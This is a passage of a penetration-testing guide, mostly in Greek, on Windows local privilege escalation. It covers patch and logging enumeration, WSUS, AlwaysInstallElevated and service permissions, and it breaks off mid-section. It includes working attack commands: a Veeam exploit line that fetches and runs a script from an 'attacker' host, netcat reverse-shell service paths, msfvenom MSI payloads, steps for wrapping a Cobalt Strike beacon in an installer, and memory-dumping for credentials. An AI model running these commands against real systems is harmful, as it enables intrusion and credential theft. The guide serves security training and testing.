# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Best tool to look for Windows local privilege escalation vectors:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Αρχική θεωρία των Windows

### Access Tokens

**Αν δεν ξέρετε τι είναι τα Windows Access Tokens, διαβάστε την ακόλουθη σελίδα πριν συνεχίσετε:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Ελέγξτε την ακόλουθη σελίδα για περισσότερες πληροφορίες σχετικά με ACLs - DACLs/SACLs/ACEs:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Αν δεν γνωρίζετε τι είναι τα integrity levels στα Windows, θα πρέπει να διαβάσετε την ακόλουθη σελίδα πριν συνεχίσετε:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Υπάρχουν διάφορα στοιχεία στα Windows που μπορεί να σας εμποδίσουν να πραγματοποιήσετε αναγνώριση του συστήματος, να τρέξετε εκτελέσιμα αρχεία ή ακόμη και να εντοπίσουν τις δραστηριότητές σας. Πρέπει να διαβάσετε την ακόλουθη σελίδα και να καταγράψετε όλους αυτούς τους μηχανισμούς άμυνας πριν ξεκινήσετε την privilege escalation enumeration:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess processes launched through `RAiLaunchAdminProcess` μπορούν να καταχραστούν για να φτάσουν σε High IL χωρίς προτροπές όταν παρακαμφθούν οι έλεγχοι secure-path του AppInfo. Δείτε την αφιερωμένη ροή παράκαμψης UIAccess/Admin Protection εδώ:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

## Πληροφορίες συστήματος

### Αναγνώριση πληροφοριών έκδοσης

Ελέγξτε αν η έκδοση των Windows έχει κάποια γνωστή ευπάθεια (ελέγξτε επίσης τα patches που έχουν εφαρμοστεί).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Εκμεταλλεύσεις εκδόσεων

Αυτό το [site](https://msrc.microsoft.com/update-guide/vulnerability) είναι χρήσιμο για την αναζήτηση λεπτομερών πληροφοριών σχετικά με ευπάθειες ασφαλείας της Microsoft. Αυτή η βάση δεδομένων περιέχει περισσότερες από 4.700 ευπάθειες ασφαλείας, δείχνοντας τη **τεράστια επιφάνεια επίθεσης** που παρουσιάζει ένα περιβάλλον Windows.

**Στο σύστημα**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Το Winpeas έχει ενσωματωμένο το watson)_

**Τοπικά με πληροφορίες συστήματος**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github repos με exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Περιβάλλον

Υπάρχουν διαπιστευτήρια/χρήσιμες πληροφορίες αποθηκευμένες στις env μεταβλητές;
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell Ιστορικό
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### Αρχεία PowerShell Transcript

Μπορείτε να μάθετε πώς να το ενεργοποιήσετε στο [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Οι λεπτομέρειες των εκτελέσεων του PowerShell pipeline καταγράφονται, περιλαμβάνοντας τις εκτελεσμένες εντολές, τις κλήσεις εντολών και τμήματα scripts. Ωστόσο, μπορεί να μην καταγράφονται πλήρως όλες οι λεπτομέρειες εκτέλεσης και τα αποτελέσματα εξόδου.

Για να το ενεργοποιήσετε, ακολουθήστε τις οδηγίες στην ενότητα "Transcript files" της τεκμηρίωσης, επιλέγοντας **"Module Logging"** αντί για **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Για να δείτε τα τελευταία 15 γεγονότα από τα PowersShell logs μπορείτε να εκτελέσετε:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Καταγράφεται πλήρες αρχείο δραστηριότητας και το πλήρες περιεχόμενο της εκτέλεσης του script, διασφαλίζοντας ότι κάθε μπλοκ κώδικα τεκμηριώνεται καθώς εκτελείται. Αυτή η διαδικασία διατηρεί ένα ολοκληρωμένο αρχείο ελέγχου για κάθε δραστηριότητα, χρήσιμο για ψηφιακή εγκληματολογία και την ανάλυση κακόβουλης συμπεριφοράς. Καταγράφοντας όλη τη δραστηριότητα κατά τον χρόνο εκτέλεσης, παρέχονται λεπτομερείς πληροφορίες για τη διαδικασία.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Τα συμβάντα καταγραφής για το Script Block μπορούν να βρεθούν μέσα στο Windows Event Viewer στη διαδρομή: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Για να δείτε τα τελευταία 20 συμβάντα μπορείτε να χρησιμοποιήσετε:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Ρυθμίσεις Διαδικτύου
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Δίσκοι
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Μπορείτε να παραβιάσετε το σύστημα εάν οι ενημερώσεις δεν ζητούνται χρησιμοποιώντας http**S** αλλά http.

Ξεκινάτε ελέγχοντας αν το δίκτυο χρησιμοποιεί ένα non-SSL WSUS update εκτελώντας τα παρακάτω στο cmd:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Ή το ακόλουθο σε PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Αν λάβετε μια απάντηση όπως μία από αυτές:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Και αν `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` ή `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` είναι ίσο με `1`.

Τότε, **είναι εκμεταλλεύσιμο.** Αν το τελευταίο κλειδί μητρώου είναι ίσο με `0`, τότε η καταχώριση WSUS θα αγνοηθεί.

Για να εκμεταλλευτείτε αυτές τις ευπάθειες μπορείτε να χρησιμοποιήσετε εργαλεία όπως: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus) - Αυτά είναι scripts εκμετάλλευσης MiTM για την έγχυση 'ψεύτικων' ενημερώσεων σε non-SSL κίνηση WSUS.

Διαβάστε την έρευνα εδώ:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Read the complete report here**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Στην ουσία, αυτή είναι η ευπάθεια που εκμεταλλεύεται αυτό το bug:

> If we have the power to modify our local user proxy, and Windows Updates uses the proxy configured in Internet Explorer’s settings, we therefore have the power to run [PyWSUS](https://github.com/GoSecure/pywsus) locally to intercept our own traffic and run code as an elevated user on our asset.
>
> Furthermore, since the WSUS service uses the current user’s settings, it will also use its certificate store. If we generate a self-signed certificate for the WSUS hostname and add this certificate into the current user’s certificate store, we will be able to intercept both HTTP and HTTPS WSUS traffic. WSUS uses no HSTS-like mechanisms to implement a trust-on-first-use type validation on the certificate. If the certificate presented is trusted by the user and has the correct hostname, it will be accepted by the service.

Μπορείτε να εκμεταλλευτείτε αυτήν την ευπάθεια χρησιμοποιώντας το εργαλείο [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) (μόλις κυκλοφορήσει).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Πολλοί enterprise agents εκθέτουν μια τοπική (localhost) επιφάνεια IPC και ένα προνομιούχο κανάλι ενημερώσεων. Εάν η enrollment μπορεί να εξαναγκαστεί προς έναν server επιτιθέμενου και ο updater εμπιστεύεται μια rogue root CA ή έχει αδύναμους ελέγχους υπογραφής, ένας τοπικός χρήστης μπορεί να παραδώσει ένα κακόβουλο MSI που εγκαθιστά η υπηρεσία SYSTEM. Δείτε μια γενικευμένη τεχνική (βασισμένη στην αλυσίδα Netskope stAgentSvc – CVE-2025-0309) εδώ:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` εκθέτει μια τοπική υπηρεσία σε **TCP/9401** που επεξεργάζεται μηνύματα ελεγχόμενα από τον επιτιθέμενο, επιτρέποντας αυθαίρετες εντολές ως **NT AUTHORITY\SYSTEM**.

- **Recon**: επιβεβαιώστε τον listener και την έκδοση, π.χ., `netstat -ano | findstr 9401` και `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: τοποθετήστε ένα PoC όπως `VeeamHax.exe` με τα απαιτούμενα Veeam DLLs στον ίδιο κατάλογο, και στη συνέχεια πυροδοτήστε ένα SYSTEM payload μέσω του τοπικού socket:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Η υπηρεσία εκτελεί την εντολή ως SYSTEM.

## KrbRelayUp

Μια ευπάθεια **local privilege escalation** υπάρχει σε περιβάλλοντα Windows **domain** υπό συγκεκριμένες προϋποθέσεις. Αυτές οι προϋποθέσεις περιλαμβάνουν περιβάλλοντα όπου το **LDAP signing is not enforced,** χρήστες που έχουν self-rights που τους επιτρέπουν να διαμορφώσουν την **Resource-Based Constrained Delegation (RBCD),** και τη δυνατότητα οι χρήστες να δημιουργούν υπολογιστές εντός του domain. Σημειώστε ότι αυτές οι **προαπαιτήσεις** ικανοποιούνται με τις **προεπιλεγμένες ρυθμίσεις**.

Βρείτε το **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Για περισσότερες πληροφορίες σχετικά με τη ροή της επίθεσης δείτε [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Εάν** αυτές οι 2 καταχωρήσεις είναι **ενεργοποιημένες** (τιμή είναι **0x1**), τότε χρήστες οποιουδήποτε επιπέδου προνομίων μπορούν να **εγκαταστήσουν** (εκτελέσουν) `*.msi` αρχεία ως NT AUTHORITY\\**SYSTEM**.
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Αν έχετε μια meterpreter session μπορείτε να αυτοματοποιήσετε αυτήν την τεχνική χρησιμοποιώντας το module **`exploit/windows/local/always_install_elevated`**

### PowerUP

Χρησιμοποιήστε την εντολή `Write-UserAddMSI` από το power-up για να δημιουργήσετε μέσα στον τρέχοντα κατάλογο ένα Windows MSI binary για να αποκτήσετε αυξημένα προνόμια. Αυτό το script γράφει έναν προ-μεταγλωττισμένο MSI εγκαταστάτη που ζητά την προσθήκη χρήστη/ομάδας (οπότε θα χρειαστείτε πρόσβαση GIU):
```
Write-UserAddMSI
```
Απλώς εκτελέστε το δημιουργημένο binary για να αποκτήσετε αυξημένα προνόμια.

### MSI Wrapper

Διαβάστε αυτόν τον οδηγό για να μάθετε πώς να δημιουργήσετε έναν MSI wrapper χρησιμοποιώντας αυτά τα εργαλεία. Σημειώστε ότι μπορείτε να τυλίξετε ένα "**.bat**" αρχείο αν **απλώς** θέλετε να **εκτελέσετε** **γραμμές εντολών**

{{#ref}}
msi-wrapper.md
{{#endref}}

### Create MSI with WIX

{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Create MSI with Visual Studio

- **Generate** with Cobalt Strike or Metasploit a **new Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Open **Visual Studio**, select **Create a new project** and type "installer" into the search box. Select the **Setup Wizard** project and click **Next**.
- Give the project a name, like **AlwaysPrivesc**, use **`C:\privesc`** for the location, select **place solution and project in the same directory**, and click **Create**.
- Keep clicking **Next** until you get to step 3 of 4 (choose files to include). Click **Add** and select the Beacon payload you just generated. Then click **Finish**.
- Highlight the **AlwaysPrivesc** project in the **Solution Explorer** and in the **Properties**, change **TargetPlatform** from **x86** to **x64**.
- There are other properties you can change, such as the **Author** and **Manufacturer** which can make the installed app look more legitimate.
- Right-click the project and select **View > Custom Actions**.
- Right-click **Install** and select **Add Custom Action**.
- Double-click on **Application Folder**, select your **beacon.exe** file and click **OK**. This will ensure that the beacon payload is executed as soon as the installer is run.
- Under the **Custom Action Properties**, change **Run64Bit** to **True**.
- Finally, **build it**.
- If the warning `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` is shown, make sure you set the platform to x64.

### MSI Installation

Για να εκτελέσετε την **installation** του κακόβουλου `.msi` αρχείου σε **background:**
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Για να εκμεταλλευτείτε αυτή την ευπάθεια μπορείτε να χρησιμοποιήσετε: _exploit/windows/local/always_install_elevated_

## Antivirus και Ανιχνευτές

### Ρυθμίσεις Καταγραφής

Αυτές οι ρυθμίσεις καθορίζουν τι **καταγράφεται**, οπότε πρέπει να δώσετε προσοχή
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding — είναι χρήσιμο να γνωρίζουμε πού αποστέλλονται τα logs
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** έχει σχεδιαστεί για τη **διαχείριση των τοπικών κωδικών του Administrator**, διασφαλίζοντας ότι κάθε κωδικός είναι **μοναδικός, τυχαίος και ενημερώνεται τακτικά** σε υπολογιστές που είναι ενταγμένοι σε domain. Αυτοί οι κωδικοί αποθηκεύονται με ασφάλεια στο Active Directory και μπορούν να προσπελαστούν μόνο από χρήστες στους οποίους έχουν δοθεί επαρκή δικαιώματα μέσω ACLs, επιτρέποντάς τους να βλέπουν τους τοπικούς κωδικούς του Administrator εφόσον είναι εξουσιοδοτημένοι.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Εάν είναι ενεργό, **οι κωδικοί σε απλό κείμενο αποθηκεύονται στο LSASS** (Local Security Authority Subsystem Service).\
[**More info about WDigest in this page**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

Από τα **Windows 8.1**, η Microsoft εισήγαγε αυξημένη προστασία για την Local Security Authority (LSA) ώστε να **μπλοκάρει** προσπάθειες από μη αξιόπιστες διεργασίες να **διαβάσουν τη μνήμη της** ή να εισάγουν κώδικα, ενισχύοντας περαιτέρω την ασφάλεια του συστήματος.\
[**More info about LSA Protection here**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** παρουσιάστηκε στο **Windows 10**. Σκοπός του είναι να προστατεύσει τα credentials αποθηκευμένα σε μια συσκευή από απειλές όπως οι επιθέσεις pass-the-hash.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

Τα **Domain credentials** επαληθεύονται από την **Local Security Authority** (LSA) και χρησιμοποιούνται από συστατικά του λειτουργικού συστήματος. Όταν τα στοιχεία σύνδεσης ενός χρήστη επαληθεύονται από ένα εγγεγραμμένο security package, συνήθως δημιουργούνται domain credentials για τον χρήστη.\
[**More info about Cached Credentials here**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Χρήστες & Ομάδες

### Απαρίθμηση Χρηστών & Ομάδων

Ελέγξτε αν κάποια από τις ομάδες στις οποίες ανήκετε έχουν ενδιαφέροντα δικαιώματα
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Ομάδες με προνόμια

Εάν **ανήκετε σε κάποια ομάδα με προνόμια, ενδέχεται να μπορείτε να αναβαθμίσετε τα προνόμιά σας**. Μάθετε για τις ομάδες με προνόμια και πώς να τις εκμεταλλευτείτε για να αναβαθμίσετε τα προνόμιά σας εδώ:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Χειρισμός token

**Μάθετε περισσότερα** για το τι είναι ένα **token** σε αυτήν τη σελίδα: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Δείτε την παρακάτω σελίδα για να **μάθετε για ενδιαφέροντα tokens** και πώς να τα εκμεταλλευτείτε:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Συνδεδεμένοι χρήστες / Συνεδρίες
```bash
qwinsta
klist sessions
```
### Φάκελοι χρήστη
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Πολιτική Κωδικών Πρόσβασης
```bash
net accounts
```
### Λήψη του περιεχομένου του πρόχειρου
```bash
powershell -command "Get-Clipboard"
```
## Εκτελούμενες Διεργασίες

### Δικαιώματα Αρχείων και Φακέλων

Πρώτα απ' όλα, κατά την καταγραφή των διεργασιών **ελέγξτε για passwords μέσα στη γραμμή εντολών της διεργασίας**.\
Ελέγξτε αν μπορείτε να **overwrite some binary running** ή αν έχετε δικαιώματα εγγραφής στον φάκελο του binary για να εκμεταλλευτείτε πιθανές [**DLL Hijacking attacks**](dll-hijacking/index.html):
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Ελέγξτε πάντα για πιθανούς [**electron/cef/chromium debuggers** που εκτελούνται, μπορείτε να τα εκμεταλλευτείτε για να escalate privileges](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Έλεγχος δικαιωμάτων των εκτελέσιμων αρχείων των διεργασιών**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Έλεγχος δικαιωμάτων των φακέλων των binaries των διεργασιών (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Μπορείτε να δημιουργήσετε ένα memory dump μιας διεργασίας που τρέχει χρησιμοποιώντας **procdump** από sysinternals. Υπηρεσίες όπως το FTP έχουν τα **credentials in clear text in memory**, δοκιμάστε να κάνετε dump τη μνήμη και να διαβάσετε τα credentials.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Ανασφαλείς GUI εφαρμογές

**Εφαρμογές που τρέχουν ως SYSTEM ενδέχεται να επιτρέψουν σε έναν χρήστη να δημιουργήσει ένα CMD ή να περιηγηθεί σε καταλόγους.**

Παράδειγμα: "Windows Help and Support" (Windows + F1), search for "command prompt", click on "Click to open Command Prompt"

## Services

Service Triggers επιτρέπουν στα Windows να ξεκινήσουν μια υπηρεσία όταν συμβαίνουν ορισμένες συνθήκες (named pipe/RPC endpoint activity, ETW events, IP availability, device arrival, GPO refresh, κ.λπ.). Ακόμα και χωρίς δικαιώματα SERVICE_START, συχνά μπορείτε να ξεκινήσετε υπηρεσίες με προνόμια ενεργοποιώντας τα triggers τους. Δείτε τεχνικές απαρίθμησης και ενεργοποίησης εδώ:

-
{{#ref}}
service-triggers.md
{{#endref}}

Πάρτε μια λίστα με τις υπηρεσίες:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Δικαιώματα

Μπορείτε να χρησιμοποιήσετε **sc** για να λάβετε πληροφορίες για μια υπηρεσία
```bash
sc qc <service_name>
```
Συνιστάται να έχετε το binary **accesschk** από το _Sysinternals_ για να ελέγξετε το απαιτούμενο επίπεδο προνομίων για κάθε υπηρεσία.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Συνιστάται να ελέγξετε εάν οι "Authenticated Users" μπορούν να τροποποιήσουν οποιαδήποτε υπηρεσία:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Ενεργοποίηση υπηρεσίας

Αν λαμβάνετε αυτό το σφάλμα (για παράδειγμα με SSDPSRV):

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

Μπορείτε να την ενεργοποιήσετε χρησιμοποιώντας
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Λάβετε υπόψη ότι η υπηρεσία upnphost εξαρτάται από την SSDPSRV για να λειτουργήσει (για XP SP1)**

**Μια άλλη λύση** σε αυτό το πρόβλημα είναι να εκτελέσετε:
```
sc.exe config usosvc start= auto
```
### **Modify service binary path**

Στο σενάριο όπου η ομάδα "Authenticated users" κατέχει **SERVICE_ALL_ACCESS** σε μια υπηρεσία, είναι δυνατή η τροποποίηση του εκτελέσιμου binary της υπηρεσίας. Για να τροποποιήσετε και να εκτελέσετε το **sc**:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Επανεκκίνηση υπηρεσίας
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privileges can be escalated through various permissions:

- **SERVICE_CHANGE_CONFIG**: Επιτρέπει την επαναδιαμόρφωση του binary της υπηρεσίας.
- **WRITE_DAC**: Ενεργοποιεί την επαναδιαμόρφωση δικαιωμάτων, οδηγώντας στην ικανότητα αλλαγής των ρυθμίσεων της υπηρεσίας.
- **WRITE_OWNER**: Επιτρέπει την απόκτηση ιδιοκτησίας και την επαναδιαμόρφωση δικαιωμάτων.
- **GENERIC_WRITE**: Κληρονομεί τη δυνατότητα αλλαγής ρυθμίσεων της υπηρεσίας.
- **GENERIC_ALL**: Επίσης κληρονομεί τη δυνατότητα αλλαγής ρυθμίσεων της υπηρεσίας.

For the detection and exploitation of this vulnerability, the _exploit/windows/local/service_permissions_ can be utilized.

### Αδύναμα δικαιώματα στα binaries υπηρεσιών

**Ελέγξτε αν μπορείτε να τροποποιήσετε το binary που εκτελείται από μια υπηρεσία** ή αν έχετε **δικαιώματα εγγραφής στο φάκελο** όπου βρίσκεται το binary ([**DLL Hijacking**](dll-hijacking/index.html)).\
Μπορείτε να πάρετε κάθε binary που εκτελείται από μια υπηρεσία χρησιμοποιώντας **wmic** (όχι στο system32) και να ελέγξετε τα δικαιώματά σας χρησιμοποιώντας **icacls**:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Μπορείτε επίσης να χρησιμοποιήσετε **sc** και **icacls**:
```bash
sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
### Δικαιώματα τροποποίησης μητρώου υπηρεσιών

Πρέπει να ελέγξετε αν μπορείτε να τροποποιήσετε κάποιο μητρώο υπηρεσιών.\
Μπορείτε να **ελέγξετε** τα **δικαιώματά** σας πάνω σε ένα **μητρώο** υπηρεσιών κάνοντας:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Πρέπει να ελεγχθεί αν οι **Authenticated Users** ή **NT AUTHORITY\INTERACTIVE** έχουν δικαιώματα `FullControl`. Αν ναι, το binary που εκτελείται από την υπηρεσία μπορεί να τροποποιηθεί.

Για να αλλάξετε τη διαδρομή του εκτελούμενου binary:
```bash
